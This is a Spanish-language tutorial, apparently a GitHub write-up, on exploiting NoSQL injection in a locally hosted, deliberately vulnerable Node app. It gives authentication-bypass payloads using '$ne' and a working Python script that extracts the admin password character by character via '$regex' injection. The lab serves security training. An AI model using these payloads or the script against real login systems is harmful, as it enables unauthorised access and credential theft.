# Laboratorio NoSQLI
----
# Preparando el laboratorio

Primero vamos a instalar el siguiente laboratorio del siguiente [repositorio](https://github.com/Charlie-belmer/vulnerable-node-app):

```bash
git clone https://github.com/Charlie-belmer/vulnerable-node-app
```

```bash
cd vulnerable-node-app
```

Ahora vamos a levantar el docker:

```bash
docker-compose up -d
```

Esperamos hasta que termine de hacer pull de las imagenes y armar el contenedor, que va ha estar en el puerto 4000

Cuando haya terminado ahora vamos a dirigirno al navegador para ver que efectivamente este todo cargado:

![Pasted image 20231008223300](https://github.com/LuisRamos98/nosqli.py/assets/55118677/a2c80c72-ef8a-4d62-8499-6cf7642ecc2d)


Ahora que vemos que todo está correcto procedemos hacer click en Populate/Reset DB:

![Pasted image 20231008222920](https://github.com/LuisRamos98/nosqli.py/assets/55118677/265b1a23-53d3-46c9-93bd-c80f9099f737)


![Pasted image 20231008223032](https://github.com/LuisRamos98/nosqli.py/assets/55118677/b65ad7e8-16d6-482e-9474-66776cdd4dd9)


Ahora vamos a login, abrimos el burpsuite y capturamos la petición:

```bash
burpsuite &>/dev/null & disown
```

![Pasted image 20231008223300](https://github.com/LuisRamos98/nosqli.py/assets/55118677/59f03848-8978-4664-9bf0-acd47acfd1db)


![Pasted image 20231008223325](https://github.com/LuisRamos98/nosqli.py/assets/55118677/ee776512-7d01-4421-8358-69aa5d0d55ef)


Ahora haremos ctrl+r para enviarlo al repeater e ir probando las inyecciones nosql.

![Pasted image 20231008223556](https://github.com/LuisRamos98/nosqli.py/assets/55118677/30a758d3-28f2-45dc-b70a-a151030b7be6)


Ahí podemos ver que en el header admite json, la peticion por post es json, y podemos probar dandole click a send viendo la respuesta en la otra ventana, vamos a utilizar lo siguiente para poder entrar como admin:

Vamos a poner en "password": {"$ne":"admin"}, aqui decimos que la contraseña no es igual a admin cual no es la contraseña por ende es verdadero y veremos lo que pasa:

![[Pasted image 20231008223910.png]]

Tambien se puede hacer en el usuario en caso que no lo sepamos, ahora tambien en "usuario":{"$ne":"guest"}, que es un usuario que existe para ver con que usuario nos logea, en este si no tienes la suficiente información vas a logearte en cualquier usuario.

![[Pasted image 20231009070422.png]]

Ahora vamos a ver un ejemplo para poder hacer un scripts en python para poder obtener la contraseña:

Utilizando regex podemos obtener cuanto characteres tienen para poder poner un limite para ello usamos {"$regex":".{30}"} y vamos cambiando el valor hasta que no obtengamos errores:

![Pasted image 20231009070853](https://github.com/LuisRamos98/nosqli.py/assets/55118677/d4271a81-f65d-48d9-8c46-c0362b73c08b)


Vemos que la contraseña no tiene 30 caracteres por lo que vamos a seguir probando hasta encontrar el limite:

![Pasted image 20231009070953](https://github.com/LuisRamos98/nosqli.py/assets/55118677/ac328760-9c2f-4da7-8dbb-2bd27747d81b)


Ahora sabremos que tenemos que limitar para encontrar la password de admin a 24, lo mismo podremos hacer con usuario y van probando, ahora vamos utilizar {"$regex":"^a"} el de aquí no es necesario ver cuando no salga error pero nos servirá para saber como va a funcionar nuestro script, va a ir caracter por  caracter hasta que salga el mensaje "Logged in as user", con ello sabemos que todo ok, y asi va a ir sumando caracteres hasta obtener la contraseña que sabemos que tiene 24 caracteres.

![Pasted image 20231009071957](https://github.com/LuisRamos98/nosqli.py/assets/55118677/f043a50e-d731-48a7-b775-f9c21f8be453)


![Pasted image 20231009071838](https://github.com/LuisRamos98/nosqli.py/assets/55118677/78be60f0-a7a8-4fa1-aa5b-7e72b1103ea8)


Ahora haremos el siguiente script y vemos el resultado:

```bash
nvim nosqli.py
```

```python 
#!/usr/bin/python3

from pwn import *
import time, signal, sys, string, requests


def def_handler(sig,frame):
    print("\n\n[+] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)


login_url = 'http://localhost:4000/user/login'
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
    
    password = ''
    
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    sleep(2)

    p2 = log.progress("Password")

    for i in range(0,24):
        for character in characters:
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character)
            headers = {'Content-Type': 'application/json'}
            
            p1.status(post_data)

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password+=character
                p2.status(password)
                break

if __name__ == "__main__":

    makeNoSQLI()
```

![Pasted image 20231009072322](https://github.com/LuisRamos98/nosqli.py/assets/55118677/26e4d657-df87-4ba5-9b9f-96882491c271)


Ya tenemos la password de admin vamos a comprobar si es cierto:

![Pasted image 20231009072535](https://github.com/LuisRamos98/nosqli.py/assets/55118677/b3d8f1a0-11d1-4682-8dd5-52f4485c4586)


Fin:)
